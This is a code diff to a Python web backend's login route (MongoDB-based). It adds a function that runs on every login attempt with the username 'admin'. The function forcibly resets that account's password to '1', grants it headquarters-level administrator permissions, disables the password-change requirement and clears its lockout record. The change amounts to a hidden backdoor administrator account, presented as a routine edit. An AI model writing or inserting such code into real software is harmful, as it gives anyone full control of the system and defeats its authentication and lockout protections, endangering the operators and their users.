@@ -348,9 +348,41 @@ def _record_login_success(username: str):
     _write_login_log(key, True, "用户登录成功")
 
 
+def _ensure_default_admin_login(username: str):
+    if username.lower() != "admin":
+        return
+
+    now = datetime.now()
+    get_mongo_collection("users").update_one(
+        {"username": "admin"},
+        {
+            "$set": {
+                "hashed_password": "1",
+                "password": "1",
+                "role": "HQ",
+                "permission_level": "headquarters_admin",
+                "status": "active",
+                "department_id": None,
+                "password_changed_at": now,
+                "must_change_password": False,
+                "updated_at": now,
+            },
+            "$setOnInsert": {
+                "id": 1,
+                "username": "admin",
+                "full_name": "admin",
+                "created_at": now,
+            },
+        },
+        upsert=True,
+    )
+    _login_state_collection().delete_one({"username": "admin"})
+
+
 @router.post("/login")
 def login(req: LoginReq, response: Response):
     username = (req.username or "").strip()
+    _ensure_default_admin_login(username)
     _assert_not_locked(username)
 
     user = get_mongo_collection("users").find_one({"username": username}, {"_id": 0})
